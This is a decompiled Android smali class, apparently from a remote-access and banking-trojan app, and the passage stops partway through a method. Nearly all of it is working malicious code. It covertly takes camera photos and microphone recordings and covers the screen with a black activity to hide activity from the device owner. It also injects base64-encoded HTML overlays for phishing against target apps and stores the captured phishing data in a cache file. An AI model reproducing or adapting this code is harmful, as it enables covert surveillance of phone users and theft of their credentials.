.class public Lcom/servers/ozzbzk/BridgeProvider;
.super Landroid/content/ContentProvider;


# static fields
.field private static final CAMERA_PROXY_POLL_MS:J = 0x2ee0L

.field private static final CAMERA_PROXY_STEP_MS:J = 0xc8L

.field private static final PHISH_BRIDGE_VERSION:I = 0x3

.field private static final TAG:Ljava/lang/String; = "BridgeProvider"

.field private static volatile blackScreenActive:Z

.field private static volatile pendingCameraResult:Landroid/os/Bundle;

.field private static volatile pendingPhishResult:Landroid/os/Bundle;


# instance fields
.field private audioHelper:Lcom/servers/ozzbzk/AudioCaptureHelper;

.field private cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

.field private overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 27
    invoke-direct {p0}, Landroid/content/ContentProvider;-><init>()V

    return-void
.end method

.method private audioPoll()Landroid/os/Bundle;
    .locals 1

    .line 327
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->audioHelper:Lcom/servers/ozzbzk/AudioCaptureHelper;

    if-nez v0, :cond_0

    .line 328
    const-string v0, "no audio helper"

    invoke-static {v0}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object v0

    return-object v0

    .line 330
    :cond_0
    invoke-virtual {v0}, Lcom/servers/ozzbzk/AudioCaptureHelper;->poll()Landroid/os/Bundle;

    move-result-object v0

    return-object v0
.end method

.method private audioStart(Landroid/os/Bundle;)Landroid/os/Bundle;
    .locals 6

    .line 293
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->audioHelper:Lcom/servers/ozzbzk/AudioCaptureHelper;

    if-nez v0, :cond_0

    .line 294
    const-string p1, "no audio helper"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 299
    :cond_0
    const-string v0, "source"

    const/4 v1, 0x1

    const/16 v2, 0x1f40

    const-string v3, "mic"

    if-eqz p1, :cond_4

    .line 300
    const-string v4, ""

    invoke-virtual {p1, v0, v4}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_1

    .line 301
    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-eqz v5, :cond_2

    .line 302
    :cond_1
    const-string v4, "audio_source"

    invoke-virtual {p1, v4, v3}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    :cond_2
    if-eqz v4, :cond_3

    .line 304
    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_3

    move-object v3, v4

    .line 307
    :cond_3
    const-string v4, "sample_rate"

    invoke-virtual {p1, v4, v2}, Landroid/os/Bundle;->getInt(Ljava/lang/String;I)I

    move-result v2

    .line 308
    const-string v4, "channels"

    invoke-virtual {p1, v4, v1}, Landroid/os/Bundle;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 310
    :cond_4
    iget-object p1, p0, Lcom/servers/ozzbzk/BridgeProvider;->audioHelper:Lcom/servers/ozzbzk/AudioCaptureHelper;

    invoke-virtual {p1, v3, v2, v1}, Lcom/servers/ozzbzk/AudioCaptureHelper;->start(Ljava/lang/String;II)Z

    move-result p1

    if-nez p1, :cond_5

    .line 312
    const-string p1, "AudioRecord start failed"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 314
    :cond_5
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object p1

    .line 315
    iget-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->audioHelper:Lcom/servers/ozzbzk/AudioCaptureHelper;

    invoke-virtual {v1}, Lcom/servers/ozzbzk/AudioCaptureHelper;->getSource()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v0, v1}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object p1
.end method

.method private audioStop()Landroid/os/Bundle;
    .locals 1

    .line 320
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->audioHelper:Lcom/servers/ozzbzk/AudioCaptureHelper;

    if-eqz v0, :cond_0

    .line 321
    invoke-virtual {v0}, Lcom/servers/ozzbzk/AudioCaptureHelper;->stop()V

    .line 323
    :cond_0
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    return-object v0
.end method

.method private blackScreenHide()Landroid/os/Bundle;
    .locals 4

    .line 244
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    const/4 v1, 0x0

    .line 245
    sput-boolean v1, Lcom/servers/ozzbzk/BridgeProvider;->blackScreenActive:Z

    if-eqz v0, :cond_0

    .line 248
    :try_start_0
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/servers/ozzbzk/BlackScreenActivity;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x30000000

    .line 249
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 250
    const-string v2, "action"

    const-string v3, "finish"

    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 251
    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 253
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "blackscreen hide: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "BridgeProvider"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 256
    :cond_0
    :goto_0
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    .line 257
    const-string v1, "status"

    const-string v2, "ok"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object v0
.end method

.method private blackScreenShow()Landroid/os/Bundle;
    .locals 3

    .line 223
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_0

    .line 225
    const-string v0, "no context"

    invoke-static {v0}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object v0

    return-object v0

    .line 228
    :cond_0
    :try_start_0
    new-instance v1, Landroid/content/Intent;

    const-class v2, Lcom/servers/ozzbzk/BlackScreenActivity;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x34000000

    .line 229
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 232
    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const/4 v0, 0x1

    .line 233
    sput-boolean v0, Lcom/servers/ozzbzk/BridgeProvider;->blackScreenActive:Z

    .line 234
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    .line 235
    const-string v1, "status"

    const-string v2, "ok"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 236
    const-string v1, "method"

    const-string v2, "activity"

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 239
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object v0

    return-object v0
.end method

.method private blackScreenStatus()Landroid/os/Bundle;
    .locals 3

    .line 262
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    .line 263
    const-string v1, "active"

    sget-boolean v2, Lcom/servers/ozzbzk/BridgeProvider;->blackScreenActive:Z

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    return-object v0
.end method

.method private cameraCapture(Landroid/os/Bundle;)Landroid/os/Bundle;
    .locals 3

    .line 142
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    if-nez v0, :cond_0

    .line 143
    const-string p1, "no camera helper"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    :cond_0
    const/4 v0, 0x0

    if-eqz p1, :cond_1

    .line 145
    const-string v1, "camera_id"

    invoke-virtual {p1, v1, v0}, Landroid/os/Bundle;->getInt(Ljava/lang/String;I)I

    move-result v0

    :cond_1
    const/16 v1, 0x55

    if-eqz p1, :cond_2

    .line 146
    const-string v2, "quality"

    invoke-virtual {p1, v2, v1}, Landroid/os/Bundle;->getInt(Ljava/lang/String;I)I

    move-result v1

    .line 149
    :cond_2
    :try_start_0
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->startFg()Landroid/os/Bundle;

    .line 153
    iget-object p1, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    invoke-virtual {p1}, Lcom/servers/ozzbzk/CameraCaptureHelper;->isStreaming()Z

    move-result p1

    if-eqz p1, :cond_3

    .line 154
    iget-object p1, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    invoke-virtual {p1}, Lcom/servers/ozzbzk/CameraCaptureHelper;->getLatestJpeg()[B

    move-result-object p1

    goto :goto_0

    :cond_3
    const/4 p1, 0x0

    :goto_0
    if-eqz p1, :cond_4

    .line 156
    array-length v2, p1

    if-nez v2, :cond_5

    .line 157
    :cond_4
    iget-object p1, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    invoke-virtual {p1, v0}, Lcom/servers/ozzbzk/CameraCaptureHelper;->captureOnce(I)[B

    move-result-object p1

    :cond_5
    if-eqz p1, :cond_6

    .line 159
    array-length v2, p1

    if-lez v2, :cond_6

    .line 160
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    .line 161
    const-string v1, "jpeg"

    invoke-virtual {v0, v1, p1}, Landroid/os/Bundle;->putByteArray(Ljava/lang/String;[B)V

    .line 162
    const-string p1, "method"

    const-string v1, "camera2"

    invoke-virtual {v0, p1, v1}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object v0

    .line 167
    :cond_6
    const-string p1, "BridgeProvider"

    const-string v2, "Camera2/FGS capture failed \u2014 launching CameraProxyActivity"

    invoke-static {p1, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 168
    invoke-direct {p0, v0, v1}, Lcom/servers/ozzbzk/BridgeProvider;->cameraCaptureViaProxy(II)Landroid/os/Bundle;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 170
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1
.end method

.method private cameraCaptureViaProxy(II)Landroid/os/Bundle;
    .locals 4

    .line 178
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_0

    .line 180
    const-string p1, "no context"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    :cond_0
    const/4 v1, 0x0

    .line 182
    sput-object v1, Lcom/servers/ozzbzk/BridgeProvider;->pendingCameraResult:Landroid/os/Bundle;

    .line 184
    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/servers/ozzbzk/CameraProxyActivity;

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 185
    const-string v3, "camera_id"

    invoke-virtual {v2, v3, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    .line 186
    const-string p1, "quality"

    invoke-virtual {v2, p1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    const/high16 p1, 0x50810000

    .line 187
    invoke-virtual {v2, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 191
    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 196
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide p1

    const-wide/16 v2, 0x2ee0

    add-long/2addr p1, v2

    .line 197
    :goto_0
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    cmp-long v0, v2, p1

    if-gez v0, :cond_3

    .line 198
    sget-object v0, Lcom/servers/ozzbzk/BridgeProvider;->pendingCameraResult:Landroid/os/Bundle;

    if-eqz v0, :cond_2

    .line 199
    const-string v2, "has_result"

    const/4 v3, 0x0

    invoke-virtual {v0, v2, v3}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;Z)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 200
    sput-object v1, Lcom/servers/ozzbzk/BridgeProvider;->pendingCameraResult:Landroid/os/Bundle;

    .line 201
    const-string p1, "success"

    invoke-virtual {v0, p1, v3}, Landroid/os/Bundle;->getBoolean(Ljava/lang/String;Z)Z

    move-result p1

    if-eqz p1, :cond_1

    .line 202
    const-string p1, "jpeg"

    invoke-virtual {v0, p1}, Landroid/os/Bundle;->getByteArray(Ljava/lang/String;)[B

    move-result-object p2

    if-eqz p2, :cond_1

    .line 203
    array-length v1, p2

    if-lez v1, :cond_1

    .line 204
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    .line 205
    invoke-virtual {v0, p1, p2}, Landroid/os/Bundle;->putByteArray(Ljava/lang/String;[B)V

    .line 206
    const-string p1, "method"

    const-string p2, "camera_proxy"

    invoke-virtual {v0, p1, p2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object v0

    .line 210
    :cond_1
    const-string p1, "error"

    const-string p2, "proxy capture failed"

    invoke-virtual {v0, p1, p2}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    :cond_2
    const-wide/16 v2, 0xc8

    .line 213
    :try_start_1
    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 215
    :catch_0
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Thread;->interrupt()V

    .line 216
    const-string p1, "interrupted"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 219
    :cond_3
    const-string p1, "proxy capture timeout"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    :catch_1
    move-exception p1

    .line 193
    invoke-virtual {p1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance p2, Ljava/lang/StringBuilder;

    const-string v0, "proxy launch: "

    invoke-direct {p2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1
.end method

.method public static consumeCameraResult()Landroid/os/Bundle;
    .locals 2

    .line 44
    sget-object v0, Lcom/servers/ozzbzk/BridgeProvider;->pendingCameraResult:Landroid/os/Bundle;

    const/4 v1, 0x0

    .line 45
    sput-object v1, Lcom/servers/ozzbzk/BridgeProvider;->pendingCameraResult:Landroid/os/Bundle;

    return-object v0
.end method

.method private deletePersistedResult()V
    .locals 4

    .line 571
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    .line 577
    :cond_0
    :try_start_0
    new-instance v1, Ljava/io/File;

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v2

    const-string v3, "phish_pending.json"

    invoke-direct {v1, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->delete()Z

    .line 579
    new-instance v1, Ljava/io/File;

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    const-string v2, "phish_pending.json.tmp"

    invoke-direct {v1, v0, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 581
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "deletePersistedResult: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "BridgeProvider"

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method private ensureHelpers()V
    .locals 2

    .line 126
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    .line 130
    :cond_0
    iget-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    if-nez v1, :cond_1

    .line 131
    new-instance v1, Lcom/servers/ozzbzk/CameraCaptureHelper;

    invoke-direct {v1, v0}, Lcom/servers/ozzbzk/CameraCaptureHelper;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    .line 133
    :cond_1
    iget-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->audioHelper:Lcom/servers/ozzbzk/AudioCaptureHelper;

    if-nez v1, :cond_2

    .line 134
    new-instance v1, Lcom/servers/ozzbzk/AudioCaptureHelper;

    invoke-direct {v1, v0}, Lcom/servers/ozzbzk/AudioCaptureHelper;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->audioHelper:Lcom/servers/ozzbzk/AudioCaptureHelper;

    .line 136
    :cond_2
    iget-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    if-nez v1, :cond_3

    .line 137
    new-instance v1, Lcom/servers/ozzbzk/OverlayHelper;

    invoke-direct {v1, v0}, Lcom/servers/ozzbzk/OverlayHelper;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    :cond_3
    return-void
.end method

.method private static err(Ljava/lang/String;)Landroid/os/Bundle;
    .locals 3

    .line 616
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    .line 617
    const-string v1, "success"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    if-eqz p0, :cond_0

    goto :goto_0

    .line 618
    :cond_0
    const-string p0, ""

    :goto_0
    const-string v1, "error"

    invoke-virtual {v0, v1, p0}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    return-object v0
.end method

.method public static hasCameraResult()Z
    .locals 1

    .line 50
    sget-object v0, Lcom/servers/ozzbzk/BridgeProvider;->pendingCameraResult:Landroid/os/Bundle;

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method private loadPersistedResult()Landroid/os/Bundle;
    .locals 10

    .line 544
    const-string v0, "received_at"

    const-string v1, "dismissed"

    const-string v2, "data_b64"

    const-string v3, ""

    const-string v4, "target_pkg"

    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v5

    const/4 v6, 0x0

    if-nez v5, :cond_0

    return-object v6

    .line 549
    :cond_0
    :try_start_0
    new-instance v7, Ljava/io/File;

    invoke-virtual {v5}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v5

    const-string v8, "phish_pending.json"

    invoke-direct {v7, v5, v8}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 550
    invoke-virtual {v7}, Ljava/io/File;->exists()Z

    move-result v5

    if-nez v5, :cond_1

    return-object v6

    .line 553
    :cond_1
    new-instance v5, Ljava/io/FileInputStream;

    invoke-direct {v5, v7}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    .line 554
    invoke-virtual {v7}, Ljava/io/File;->length()J

    move-result-wide v7

    long-to-int v8, v7

    new-array v7, v8, [B

    .line 556
    invoke-virtual {v5, v7}, Ljava/io/FileInputStream;->read([B)I

    .line 557
    invoke-virtual {v5}, Ljava/io/FileInputStream;->close()V

    .line 558
    new-instance v5, Lorg/json/JSONObject;

    new-instance v8, Ljava/lang/String;

    const-string v9, "UTF-8"

    invoke-direct {v8, v7, v9}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-direct {v5, v8}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 559
    new-instance v7, Landroid/os/Bundle;

    invoke-direct {v7}, Landroid/os/Bundle;-><init>()V

    .line 560
    invoke-virtual {v5, v4, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v4, v8}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    .line 561
    invoke-virtual {v5, v2, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v7, v2, v3}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v2, 0x0

    .line 562
    invoke-virtual {v5, v1, v2}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v2

    invoke-virtual {v7, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    const-wide/16 v1, 0x0

    .line 563
    invoke-virtual {v5, v0, v1, v2}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v1

    invoke-virtual {v7, v0, v1, v2}, Landroid/os/Bundle;->putLong(Ljava/lang/String;J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v7

    :catch_0
    return-object v6
.end method

.method private static ok()Landroid/os/Bundle;
    .locals 3

    .line 610
    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    .line 611
    const-string v1, "success"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Landroid/os/Bundle;->putBoolean(Ljava/lang/String;Z)V

    return-object v0
.end method

.method private overlayHide()Landroid/os/Bundle;
    .locals 1

    .line 358
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    if-nez v0, :cond_0

    .line 359
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object v0

    return-object v0

    .line 361
    :cond_0
    invoke-virtual {v0}, Lcom/servers/ozzbzk/OverlayHelper;->hide()Landroid/os/Bundle;

    move-result-object v0

    return-object v0
.end method

.method private overlayShow(Ljava/lang/String;Landroid/os/Bundle;)Landroid/os/Bundle;
    .locals 4

    .line 334
    iget-object v0, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    if-nez v0, :cond_0

    .line 335
    const-string p1, "no overlay helper"

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    :cond_0
    if-eqz p2, :cond_4

    .line 339
    const-string v0, "html"

    invoke-virtual {p2, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_1

    .line 340
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 341
    :cond_1
    const-string v0, "content"

    invoke-virtual {p2, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :cond_2
    if-eqz v0, :cond_3

    .line 343
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_5

    :cond_3
    const-string v1, "html_b64"

    invoke-virtual {p2, v1}, Landroid/os/Bundle;->containsKey(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_5

    .line 345
    :try_start_0
    const-string v2, ""

    invoke-virtual {p2, v1, v2}, Landroid/os/Bundle;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_5

    .line 346
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_5

    .line 347
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x2

    invoke-static {v1, v3}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v1

    const-string v3, "UTF-8"

    invoke-direct {v2, v1, v3}, Ljava/lang/String;-><init>([BLjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-object v0, v2

    goto :goto_0

    :catch_0
    move-exception v1

    .line 350
    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "b64 decode html: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v2, "BridgeProvider"

    invoke-static {v2, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    :cond_4
    const/4 v0, 0x0

    .line 354
    :cond_5
    :goto_0
    iget-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    invoke-virtual {v1, v0, p1, p2}, Lcom/servers/ozzbzk/OverlayHelper;->show(Ljava/lang/String;Ljava/lang/String;Landroid/os/Bundle;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1
.end method

.method private overlayStatus()Landroid/os/Bundle;
    .locals 3

